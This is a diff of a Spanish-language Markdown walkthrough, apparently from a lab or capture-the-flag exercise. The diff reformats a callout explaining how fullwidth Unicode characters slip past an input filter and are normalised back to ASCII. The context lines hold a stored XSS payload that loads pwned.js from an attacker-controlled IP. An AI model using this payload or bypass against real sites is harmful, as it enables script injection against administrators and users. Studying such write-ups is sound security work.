@@ -70,8 +70,8 @@ Como bien hemos visto antes, el usuario **admin** está revisando los nuevos usu
 ＜script ｓｒｃ＝＂http：／／192．168．26．10／pwned．js＂＞＜／script＞
 ```
 
->[!INFO]
-> Al registrar un usuario con los anteriores caracteres especiales (**Unicode**), evitaremos la comprobación que se realiza por caracteres como `>`, `<`, `"`, `/`, entre otros. Además, dado que se está aplicando una normalización de caracteres por detrás, finalmente estos serán convertidos a su forma original en **ASCII**.
+>
+{: Al registrar un usuario con los anteriores caracteres especiales (**Unicode**), evitaremos la comprobación que se realiza por caracteres como `>`, `<`, `"`, `/`, entre otros. Además, dado que se está aplicando una normalización de caracteres por detrás, finalmente estos serán convertidos a su forma original en **ASCII**. }
 
 Veremos como recibimos una petición al archivo `pwned.js`.
 
